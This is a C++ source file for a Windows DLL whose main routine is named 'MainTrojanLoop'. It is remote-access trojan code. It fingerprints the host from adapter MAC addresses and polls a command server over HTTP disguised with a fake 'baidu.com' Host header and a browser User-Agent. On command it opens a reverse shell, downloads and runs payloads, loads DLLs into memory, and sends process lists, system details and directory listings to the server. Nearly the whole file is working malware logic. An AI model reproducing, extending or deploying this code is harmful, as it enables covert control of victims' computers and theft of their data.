// shellocde-dll.cpp : Defines the exported functions for the DLL application.
//

#include "stdafx.h"
#include "shellocde-dll.h"
#include "../http-client-c.h"
#include "../encryptor/encryptor.h"

#pragma warning(disable: 4996)

#pragma comment(lib,"Iphlpapi.lib")

#define DEBUG

#define MSGPOST(msg) http_post((char *)REVERSE_MAIN_HTTP, NULL, (char *)msg)

#define STRING(arg) #arg
#define CAT(arg1, arg2) arg1 ## arg2

char sendBuf[8192];
DWORD MACHINEGUID = 0;
char MACHINEGUIDSTR[9];
char dllMemory[1024 * 1024];

extern "C" 
{
#ifndef DEBUG
	CHAR * http_warpper(char *sendBuf, const char *data)
	{
		/*
		(Dst, Src)
		*/
		strcat(sendBuf, "POST ");
		strcat(sendBuf, "/shell");
		strcat(sendBuf, " HTTP/1.1\r\n");
		strcat(sendBuf, "Host: ");
		strcat(sendBuf, "baidu.com");
		strcat(sendBuf, "\r\n");
		strcat(sendBuf, "Connection: keep-alive\r\n");
		strcat(sendBuf, "Cache-Control: max-age=0\r\n");
		strcat(sendBuf, "Upgrade-Insecure-Requests: 1\r\n");
		strcat(sendBuf, "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36\r\n");
		strcat(sendBuf, "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\r\n");
		strcat(sendBuf, "Accept-Encoding: gzip, deflate, br\r\n");
		strcat(sendBuf, "Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7\r\n");

		strcat(sendBuf, "\r\n");
		strcat(sendBuf, data);
		return sendBuf;
	}
#endif // DEBUG

#ifndef DEBUG

	CHAR * http_dewarpper(char *recvBuf, int offset)
	{
		/*
		User free() after http_dewarpper
		*/
		char * httpRecvBuf = (char *)malloc(2048);
		memset(httpRecvBuf, 0, 2048);
		char * current = &recvBuf[offset];
		memcpy(httpRecvBuf, current, 2048 - offset);
		return httpRecvBuf;
	}

#endif // !DEBUG

#ifndef DEBUG
	__declspec(dllexport) struct Connection * buildConnection(const char * ip, int port)
	{

		struct Connection * con = (struct Connection *)malloc(sizeof(struct Connection));
		con->serv = (struct sockaddr_in *)malloc(sizeof(sockaddr_in));
		DWORD error;

		if ((con->s = socket(AF_INET, SOCK_STREAM, 0)) < 0)
		{
			perror("Socket Error");
			return 0;
		}

		memset(con->serv, 0, sizeof(struct sockaddr_in));
		con->serv->sin_family = AF_INET;
		con->serv->sin_port = htons(port);
		con->serv->sin_addr.S_un.S_addr = inet_addr(REVERSE_MAIN_IP);

		DWORD tmp = (DWORD)con->serv;

		//if ((connect(con->s, (struct sockaddr *)&(*(con->serv)), sizeof(con->serv)))<0)
		if ((error = connect(con->s, (struct sockaddr *)tmp, sizeof(*(con->serv)))) < 0)
		{
			error = WSAGetLastError();
			printf("%d", error);
			perror("connet error!");
			return 0;
		}

		return con;
	}

	void destoryConnection(struct Connection * con)
	{
		closesocket(con->s);
	}

	DWORD sendDataConnection(struct Connection * con, char * httpData)
	{
		int num;
		num = send(con->s, httpData, strlen(httpData), 0);
		return num;
	}

	DWORD recvDataConnection(struct Connection * con, char *httpData)
	{
		int num;
		num = recv(con->s, httpData, 2048, 0);
		return num;
	}


#endif // !DEBUG

	__declspec(dllexport) DWORD machineGUID()
	{
		DWORD result = 0;
		DWORD tmpCalc = 0;
		IP_ADAPTER_INFO AdapterInfo[16];
		DWORD dwBuflen = sizeof(AdapterInfo);

		DWORD dwStatus = GetAdaptersInfo(AdapterInfo, &dwBuflen);

		PIP_ADAPTER_INFO pAdapterInfo = AdapterInfo;

		do {
			((DWORD *)&tmpCalc)[0] = ((DWORD *)pAdapterInfo->Address)[0];
			((BYTE *)&tmpCalc)[1] += pAdapterInfo->Address[4];
			((BYTE *)&tmpCalc)[2] += pAdapterInfo->Address[5];
			_asm {
				mov eax, tmpCalc
				ror eax, 13
				mov tmpCalc, eax
			}
			result += tmpCalc;
			pAdapterInfo = pAdapterInfo->Next;
		} while (pAdapterInfo);
		return result;
	}

	__declspec(dllexport) BOOL WINAPI MainTrojanLoop()
	{
		setbuf(stdin, NULL);
		setbuf(stdout, NULL);
		setbuf(stderr, NULL);

		struct Connection * conn;

		WSADATA wsa;
		WSAStartup(MAKEWORD(2, 1), &wsa);

#ifndef DEBUG

		conn = buildConnection(REVERSE_MAIN_IP, REVERSE_MAIN_PORT);
#endif // !DEBUG

		char handShakeEntry[] = "Entry.";
		char handShakeExit[] = "Exit.";
		srand(3);
#ifndef DEBUG
		char recvBuf[2048];
		memset(recvBuf, 0, 2048);
#endif // !DEBUG

#ifndef DEBUG
		http_warpper(sendBuf, handShakeEntry);
		sendDataConnection(conn, sendBuf);
#endif // !DEBUG

		MACHINEGUID = machineGUID();
		sprintf(MACHINEGUIDSTR, "%08x", MACHINEGUID);

		while (TRUE)
		{
			memset(sendBuf, 0, sizeof(sendBuf));
			strcat(sendBuf, "id=");
			strcat(sendBuf, MACHINEGUIDSTR);
			strcat(sendBuf, "&");
#ifndef DEBUG
			recvDataConnection(conn, recvBuf);
#else
			struct http_response * hresp = http_get((char *)REVERSE_MAIN_HTTP, NULL);
#endif // !DEBUG


#ifndef DEBUG
			if (strncmp(recvBuf, "00", 2) == 0) // Exit
			{
				memset(sendBuf, 0, 2048);
				http_warpper(sendBuf, handShakeEntry);
				sendDataConnection(conn, sendBuf);
				break;
			}
			else if (strncmp(recvBuf, "01", 2) == 0) // Shell
			{
				reverseTCP();
			}
			else if (strncmp(recvBuf, "02", 2) == 0) // download
			{
				strtok(recvBuf, "\n");
				char * URL;
				char * fileName;

				URL = strtok(recvBuf, "\n");
				fileName = strtok(recvBuf, "\n");

				downloader(URL, fileName);
			}
			else if (strncmp(recvBuf, "03", 2) == 0) // downloadAndExec
			{
				strtok(recvBuf, "\n");
				char * URL;
				char * fileName;

				URL = strtok(recvBuf, "\n");
				fileName = strtok(recvBuf, "\n");

				downloadAndExec(URL, fileName);
			}
			else if(strncmp(recvBuf, "04", 2) == 0) // baseInfoScan
			{
				struct ProcessInfo * processInfo = NULL; // 需要初始化？防止野指针？
				struct ProcessInfo * current;
				struct HardwareInfo hardwareInfo;
				char sendBufTmp[2048] = { 0 };
				char osVersion[128] = { 0 };
				hardwareInfoScan(hardwareInfo);
				processScan(processInfo);
				osInfoScan(osVersion);
				memset(sendBufTmp, 0, 2048);
				strcat(sendBufTmp, osVersion);
				strcat(sendBufTmp, hardwareInfo.cpuInfo.cpuType);
				strcat(sendBufTmp, "\n");
				do {
					strcat(sendBufTmp, processInfo->szExeFile);
					strcat(sendBufTmp, "\n");
				} while (current = processInfo->next);
				http_warpper(sendBuf, sendBufTmp);
				sendDataConnection(conn, sendBuf);
			}
			else if(strncmp(recvBuf, "05", 2) == 0) // fileExplorer
			{
				strtok(recvBuf, "\n");
				char * filePath;
				char * fileList;

				filePath = strtok(NULL, "\n");
				fileList = fileExplorer(filePath);
				if (fileList)
				{
					memset(sendBuf, 0, 2048);
					http_warpper(sendBuf, fileList);
					sendDataConnection(conn, sendBuf);
				}
				else
				{
					memset(sendBuf, 0, 2048);
					http_warpper(sendBuf, "Invilid Path\n");
					sendDataConnection(conn, sendBuf);
				}
			}
			else if (strncmp(recvBuf, "06", 2) == 0) // downloadA and loadLibraryA dll
			{
				strtok(recvBuf, "\n");
				char * URL;
				char * fileName;

				URL = strtok(recvBuf, "\n");
				fileName = strtok(recvBuf, "\n");

				downloader(URL, fileName);
				LoadLibraryA(fileName);
			}
		}
		WSACleanup();
#else
			/*
				Msg=S/F
					Success exec or Fail
				Data=dataaaaaa
					Data we need
				....
			*/
			if (strncmp(hresp->body, "00", 2) == 0) 
				// Exit
			{
				strcat(sendBuf, "Msg=");
				base64_encode("Ex", sizeof("Ex") - 1, sendBuf+4);
				MSGPOST(sendBuf);
				break;
			}
			else if (strncmp(hresp->body, "01", 2) == 0) 
				// Shell
			{
				strcat(sendBuf, "Msg=");
				base64_encode("Sh", sizeof("Sh") - 1, sendBuf+4);
				MSGPOST(sendBuf);
				reverseTCP();
			}
			else if (strncmp(hresp->body, "02", 2) == 0) 
				// Download
			{
				strtok(hresp->body, "\n");
				char * URL;
				char * fileName;

				URL = strtok(NULL, "\n");
				fileName = strtok(NULL, "\n");

				downloader(URL, fileName);
				strcat(sendBuf, "Msg=");
				base64_encode("Do", sizeof("Do") - 1, sendBuf + 4);
				MSGPOST(sendBuf);
			}
			else if (strncmp(hresp->body, "03", 2) == 0)
				// DownloadAndExec
			{
				strtok(hresp->body, "\n");
				char * URL;
				char * fileName;

				URL = strtok(NULL, "\n");
				fileName = strtok(NULL, "\n");

				downloadAndExec(URL, fileName);
				strcat(sendBuf, "Msg=");
				base64_encode("De", sizeof("De") - 1, sendBuf + 4);
				MSGPOST(sendBuf);
			}
			else if (strncmp(hresp->body, "04", 2) == 0) 
				// BaseInfoScan
			{
				struct ProcessInfo * processInfo = NULL; // 需要初始化？防止野指针？
				struct ProcessInfo * current;
				struct HardwareInfo hardwareInfo;
				char * sendBufTmp = (char *)calloc(8192, 1);
				char osVersion[128] = { 0 };
				hardwareInfoScan(hardwareInfo);
				processInfo = processScan(processInfo);
				current = processInfo;
				osInfoScan(osVersion);

				strcat(sendBuf, "Msg=");
				base64_encode("Bs", sizeof("Bs") - 1, sendBuf + 4);

				strcat(sendBuf, "&Data=");

				strcat(sendBufTmp, osVersion);
				strcat(sendBufTmp, hardwareInfo.cpuInfo.cpuType);
				strcat(sendBufTmp, "\n");
				do {
					strcat(sendBufTmp, current->szExeFile);
					strcat(sendBufTmp, "\n");
				} while (current = current->next);

				base64_encode(sendBufTmp, strlen(sendBufTmp) - 1, sendBuf + strlen(sendBuf));
				free(sendBufTmp);
				MSGPOST(sendBuf);

			}
			else if (strncmp(hresp->body, "05", 2) == 0)
				// fileExplorer
			{
				strtok(hresp->body, "\n");
				char * filePath;
				char * fileList;

				filePath = strtok(NULL, "\n");
				fileList = fileExplorer(filePath);
				if (fileList)
				{
					strcat(sendBuf, "Msg=");
					
					base64_encode("Fe", sizeof("Fe") - 1, sendBuf + strlen(sendBuf));
					strcat(sendBuf, "&Data=");
					base64_encode(fileList, strlen(fileList) - 1, sendBuf + strlen(sendBuf));

					printf(sendBuf);
					puts("\n");


					MSGPOST(sendBuf);
				}
				else
				{
					strcat(sendBuf, "Msg=");
					base64_encode("F", sizeof("F") - 1, sendBuf + strlen(sendBuf));
					MSGPOST(sendBuf);
				}
			}
			else if (strncmp(hresp->body, "06", 2) == 0) 
				// TransLibMemoryLoad
				// http transform a dll and MemoryLoadLibrary it, Sometimes some function will be exec.
			{
				struct http_response * dll_http_response = NULL;
				//BYTE * dllMemory = NULL;
				int bufLen = 0;
				HMEMORYMODULE HMenoryModule;

				// hand shake
				strcat(sendBuf, "Msg=");
				base64_encode("Start", sizeof("Start") - 1, sendBuf + strlen(sendBuf));
				printf(sendBuf);
				dll_http_response = MSGPOST(sendBuf);

				// init
				bufLen = 1024 * 1024;
				memset(dllMemory, 0, 1024 * 1024);
				base64_decode(dll_http_response->body, bufLen - 1, dllMemory);

				// Loadlibrary
				HMenoryModule = MemoryLoadLibrary(dllMemory, bufLen);

				// destroy
				MemoryFreeLibrary(HMenoryModule);
				//free(dllMemory);

				/*
				FILE * file;
				file = fopen("./a.dll", "wb");
				if (file == NULL)
				{
					printf("OPen FILE error\n");
					return 0;
				}
				fwrite(dllMemory, 1, 1024 * 1024, file);
				fclose(file);
				*/

				memset(sendBuf, 0, sizeof(*sendBuf));
				strcat(sendBuf, "Msg=");
				base64_encode("Se", sizeof("Se") - 1, sendBuf + 4);
				MSGPOST(sendBuf);
			}
			else if (strncmp(hresp->body, "07", 2) == 0)
			{
				sendBuf[strlen(sendBuf) - 1] = '\0';
				MSGPOST(sendBuf);
				Sleep(1000 * 3);
				continue;
			}
			
			int a = 0;
			a = rand() % 100;
			//printf("%d\n", a);
			Sleep(100 * a);
			
		}
#endif // !DEBUG
		return 0;
	}
}